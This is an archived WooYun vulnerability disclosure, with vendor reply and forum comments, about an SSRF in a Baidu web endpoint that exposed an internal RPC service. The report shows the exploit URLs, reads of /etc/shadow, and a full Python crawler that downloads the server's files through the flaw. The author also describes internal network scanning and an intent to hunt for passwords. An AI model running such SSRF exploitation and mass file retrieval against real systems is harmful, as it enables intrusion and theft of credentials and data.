{"id": 74126, "wybug_id": "wooyun-2016-0167695", "wybug_title": "一次险些探测百度服务器的过程(从xss被礼节炮/到ssrf内网探测/再到rpc高权限全服务器文件读取)", "wybug_corp": "百度", "wybug_author": "hear7v", "wybug_date": "2016-01-06 09:44", "wybug_open_date": "2016-02-12 18:49", "wybug_type": "内部绝密信息泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["渗透测试思路", "内部敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向公众公开  简要描述： rt 详细说明：  之前交了一个百度反射xss，虽然也感觉没多大用，不过1rank这样的礼节rank，虽然寄了礼物心中依然忿忿不平，再来到触发点处测试一开始打算的ssrf，当然，在写这报告的时候，最危险的洞由于昨晚用力太猛，已经被堵住，不过还是泄露了不少信息漏洞处\nhttp://webapp.cbs.baidu.com/rsstopic/gate?cbsonline=1&p=t&brand=top&rssadv=1&src=http://127.0.0.1:403&qq-pf-to=pcqq.c2c\n主要是这里的src变量，我们输入www.baidu.com这些都可以成功得到访问信息，确认ssrf的存在，接下来先探测主机端口\n\n这里我们发现了403等端口，访问\n\n发现是百度rpc，下面的指令只能成功地执行少部分，获取一些并不敏感的主机信息\n\n什么cpu信息，主机内核信息等，都无关紧要，这里不贴，接下来几天用脚本burp疯狂地对src进行10.x.x.x这样的内网ip探测，但是依旧没什么发现，基本准备放弃这个洞了。昨天，想起了再看看这个地方，把url精简了下\nhttp://webapp.cbs.baidu.com/rsstopic/gate?cbsonline=7&src=http://127.0.0.1:403\n因为其他参数都是影响页面显示，没太大作用，现在一个cbsonline，一个src，src的作用我们知道，但是cbsonline的作用不清楚，先fuzz一下，\n\n果然有发现1,4,7，我们来试试改变cbsonline参数\n\n\n\n我们可以发现当cbsonline改成1的时候页面看着最舒服，我们再来试一下之前没有成功 的一些命令，\n\n惊奇发现，全目录遍历，我们再来看看能不能读取\n\nshadow直接读取了，很是开心，于是开始手动地搜集敏感信息\n\n用户的操作信息，从这些信息里面我们可以看到很多内网的ip，域名等敏感信息，\n\n\n\n于是，话不多说写个脚本爬出所用文件信息，作死的一步。。。\n#!/usr/bin/env python#*******************************## Description: baidu_rpc        ## Author: hear7v                ##*******************************#import requestsimport sysimport osimport timeSession = requests.Session()url = \"http://webapp.cbs.baidu.com/rsstopic/gate\"base = 'http://127.0.0.1:403/'def spider(str):    time.sleep(1)    nBase = base + str    Params = {'cbsonline':'1', 'src':nBase}    r = Session.get(url, params = Params)    ans = r.content    if \"<a href=\\\"/dir/\" in ans:        os.mkdir(str)        print \"mkdir %s\"%str        list1 = ans.split('</a>')        # print list1        list2 = []        # print list1        for st in list1[0:len(list1)-1]:            temp = st.split('>')            temp = temp[len(temp)-1]            if (len(temp)>0 and temp!='.' and temp!='..'):                list2.append(temp)        # print list2        for i in list2:            spider(str+'/'+i)    else:        print \"mkfile %s\"%str        f = open(str, 'a')        f.write(ans)        f.closespider(\"dir\")\n\n\n到这里，就准备安安心心睡觉，第二天早上起来稳稳当当发财，到时候爬下所用文件，翻翻配置文件啊，找点数据库密码什么的，不过人还是太年轻，可能也和前几天肆无忌惮地爆内网有关，。。第二天早上起来发现。。\n\n怎么好多文件夹是makefile操作。。。好吧。。。再试试之前的payload发现，url的cbsonline参数已经做了处理，最终爬下来的文件。。\n\nhome里面爬了一半左右，看了下还是有不少敏感信息，只怪自己经验太少，实在是想不到百度安全在凌晨竟然会如此给力。本来指望着这个洞爬完文件，找找密码，交个wooyun，家里金毛明年的狗粮就有着落了。不过希望管理大大，看在这也是少有的对rpc的利用多给点rank，而且思路也比较奇葩，看能不能打个雷吧。   漏洞证明：  之前交了一个百度反射xss，虽然也感觉没多大用，不过1rank这样的礼节rank，虽然寄了礼物心中依然忿忿不平，再来到触发点处测试一开始打算的ssrf，当然，在写这报告的时候，最危险的洞由于昨晚用力太猛，已经被堵住，不过还是泄露了不少信息漏洞处\nhttp://webapp.cbs.baidu.com/rsstopic/gate?cbsonline=1&p=t&brand=top&rssadv=1&src=http://127.0.0.1:403&qq-pf-to=pcqq.c2c\n主要是这里的src变量，我们输入www.baidu.com这些都可以成功得到访问信息，确认ssrf的存在，接下来先探测主机端口\n\n这里我们发现了403等端口，访问\n\n发现是百度rpc，下面的指令只能成功地执行少部分，获取一些并不敏感的主机信息\n\n什么cpu信息，主机内核信息等，都无关紧要，这里不贴，接下来几天用脚本burp疯狂地对src进行10.x.x.x这样的内网ip探测，但是依旧没什么发现，基本准备放弃这个洞了。昨天，想起了再看看这个地方，把url精简了下\nhttp://webapp.cbs.baidu.com/rsstopic/gate?cbsonline=7&src=http://127.0.0.1:403\n因为其他参数都是影响页面显示，没太大作用，现在一个cbsonline，一个src，src的作用我们知道，但是cbsonline的作用不清楚，先fuzz一下，\n\n果然有发现1,4,7，我们来试试改变cbsonline参数\n\n\n\n我们可以发现当cbsonline改成1的时候页面看着最舒服，我们再来试一下之前没有成功 的一些命令，\n\n惊奇发现，全目录遍历，我们再来看看能不能读取\n\nshadow直接读取了，很是开心，于是开始手动地搜集敏感信息\n\n用户的操作信息，从这些信息里面我们可以看到很多内网的ip，域名等敏感信息，\n\n\n\n于是，话不多说写个脚本爬出所用文件信息，作死的一步。。。\n#!/usr/bin/env python#*******************************## Description: baidu_rpc        ## Author: hear7v                ##*******************************#import requestsimport sysimport osimport timeSession = requests.Session()url = \"http://webapp.cbs.baidu.com/rsstopic/gate\"base = 'http://127.0.0.1:403/'def spider(str):    time.sleep(1)    nBase = base + str    Params = {'cbsonline':'1', 'src':nBase}    r = Session.get(url, params = Params)    ans = r.content    if \"<a href=\\\"/dir/\" in ans:        os.mkdir(str)        print \"mkdir %s\"%str        list1 = ans.split('</a>')        # print list1        list2 = []        # print list1        for st in list1[0:len(list1)-1]:            temp = st.split('>')            temp = temp[len(temp)-1]            if (len(temp)>0 and temp!='.' and temp!='..'):                list2.append(temp)        # print list2        for i in list2:            spider(str+'/'+i)    else:        print \"mkfile %s\"%str        f = open(str, 'a')        f.write(ans)        f.closespider(\"dir\")\n\n\n到这里，就准备安安心心睡觉，第二天早上起来稳稳当当发财，到时候爬下所用文件，翻翻配置文件啊，找点数据库密码什么的，不过人还是太年轻，可能也和前几天肆无忌惮地爆内网有关，。。第二天早上起来发现。。\n\n怎么好多文件夹是makefile操作。。。好吧。。。再试试之前的payload发现，url的cbsonline参数已经做了处理，最终爬下来的文件。。\n\nhome里面爬了一半左右，看了下还是有不少敏感信息，只怪自己经验太少，实在是想不到百度安全在凌晨竟然会如此给力。本来指望着这个洞爬完文件，找找密码，交个wooyun，家里金毛明年的狗粮就有着落了。不过希望管理大大，看在这也是少有的对rpc的利用多给点rank，而且思路也比较奇葩看能不能打个雷吧。   修复方案：  主机ssh密码泄露，改了，其他配置文件，这些都要修改，etc全部泄露了，在用户的操作bash记录里面泄露了不少内网ip和相应的文件传送记录，域名这些也有，建议定期删除bashhistory，其他的泄露的文件里面信息还是很多的。学生党，期末，幸好被发现了，不然不知道要耽搁多少时间在这上面，说不准就挂科了。thx，百度安全哥哥们   版权声明：转载请注明来源 hear7v@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-01-06 13:35 厂商回复： 非常感谢您的报告，问题已着手处理，感谢您对百度安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-06 09:46 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2970 漏洞数:585        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  66666    \n     2016-01-06 09:49 |    \t\t我的邻居王婆婆 \t\t\t( 普通白帽子  |\t\t\t        Rank:2981 漏洞数:505        | 刚发现个好洞网站就挂了)\t\t \n  礼节炮是什么    \n     2016-01-06 09:51 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:208 漏洞数:59        | 工欲善其事，必先利其器)\t\t \n  炮筒    \n     2016-01-06 09:51 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:278 漏洞数:91        | The quiter you are,the more you're able ...)\t\t \n  66666    \n     2016-01-06 09:52 |    \t\t荒废的腰子 \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:14        | 以前的马甲不用了~~~)\t\t \n  什么炮？    \n     2016-01-06 09:54 |    \t\tsauce \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:11        | 酱油一个)\t\t \n  打炮，，友情炮    \n     2016-01-06 10:13 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:711 漏洞数:73        | root@qisec.com)\t\t \n  后悔了吧，钱没了吧，哈哈    \n     2016-01-06 10:20 |    \t\tsecart \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        | 这个人很懒，什么都没留。)\t\t \n  999999    \n     2016-01-06 10:36 |    \t\t玄清 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 漏洞爱好者)\t\t \n  吊炸天    \n     2016-01-06 10:41 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 每日必关注乌云)\t\t \n  叫地主    \n     2016-01-06 10:41 |    \t\thear7v \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 咳咳，kkcpp)\t\t \n  事已至此，看能不能给点买书的钱。。想多了。。5555    \n     2016-01-06 10:58 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:208 漏洞数:59        | 工欲善其事，必先利其器)\t\t \n  @hear7v ...    \n     2016-01-06 11:01 |    \t\tFormat_smile \t\t\t( 普通白帽子  |\t\t\t        Rank:328 漏洞数:122        | ···孰能无过，谁是谁非！)\t\t \n  洞主太6    \n     2016-01-06 12:14 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:41        )\t\t \n  66666    \n     2016-01-06 12:31 |    \t\tSakura丶小樱 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | poi？)\t\t \n  破公司吃枣药丸    \n     2016-01-06 12:38 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:285 漏洞数:48        | little red pig!)\t\t \n  不明觉厉    \n     2016-01-06 12:49 |    \t\tB1acken \t\t\t( 普通白帽子  |\t\t\t        Rank:175 漏洞数:57        | 渣渣)\t\t \n  敢搞百度，顿哥封他号    \n     2016-01-06 13:02 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1380 漏洞数:199        | 。)\t\t \n  路过 打炮还是？    \n     2016-01-06 13:11 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1074 漏洞数:181        | px1624)\t\t \n  ddddd    \n     2016-01-06 13:14 |    \t\tthewind \t\t\t( 普通白帽子  |\t\t\t        Rank:149 漏洞数:37        | 小白……)\t\t \n  围观    \n     2016-01-06 14:32 |    \t\thear7v \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 咳咳，kkcpp)\t\t \n  @百度 哎哟，又是一巴掌，是因为已经修了么，感觉好低啊    \n     2016-01-23 14:07 |    \t\tChinalover \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:8        | 你看得到我打在屏幕上的字，却看不到我落在...)\t\t \n  做题的路过。。。    \n     2016-01-23 14:23 |    \t\tWinterSun \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 这个人很懒，没有介绍。)\t\t \n  做题的路过。。    \n     2016-01-23 14:26 |    \t\tl0wK3y \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:13        | 读囚徒健身，当技术大拿)\t\t \n  做题的路过。。    \n     2016-01-23 14:32 |    \t\tXiaoPY \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  做题的路过。。    \n     2016-01-23 17:02 |    \t\tMaster \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:10        )\t\t \n  做题的路过。。    \n     2016-01-23 17:03 |    \t\thear7v \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 咳咳，kkcpp)\t\t \n  好好做题，能做出来，不是完全是这个思路    \n     2016-01-23 17:09 |    \t\tT3qui1a \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 小白)\t\t \n  做题的路过，表示看不到怎么办=、=    \n     2016-01-23 18:47 |    \t\tChinalover \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:8        | 你看得到我打在屏幕上的字，却看不到我落在...)\t\t \n  @hear7v 说得好像我们是核心白帽子能看到过程一样。。    \n     2016-01-23 23:04 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1821 漏洞数:181        | 力不从心)\t\t \n  做啥题？    \n     2016-01-24 16:28 |    \t\ts.sky \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 小小白)\t\t \n  做题的路过，表示看不到怎么办=、=     \n     2016-01-26 14:12 |    \t\t暴走 \t\t\t( 普通白帽子  |\t\t\t        Rank:454 漏洞数:88        | Wooyun的Rank获取如同Dota冲天梯有过之而无...)\t\t \n  我学习到一个新名词，礼节炮!    \n     2016-01-27 18:13 |    \t\t1c3z \t\t\t( 普通白帽子  |\t\t\t        Rank:285 漏洞数:61        | 找工作，找工作。)\t\t \n  楼楼应该换台电脑了，快80%    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}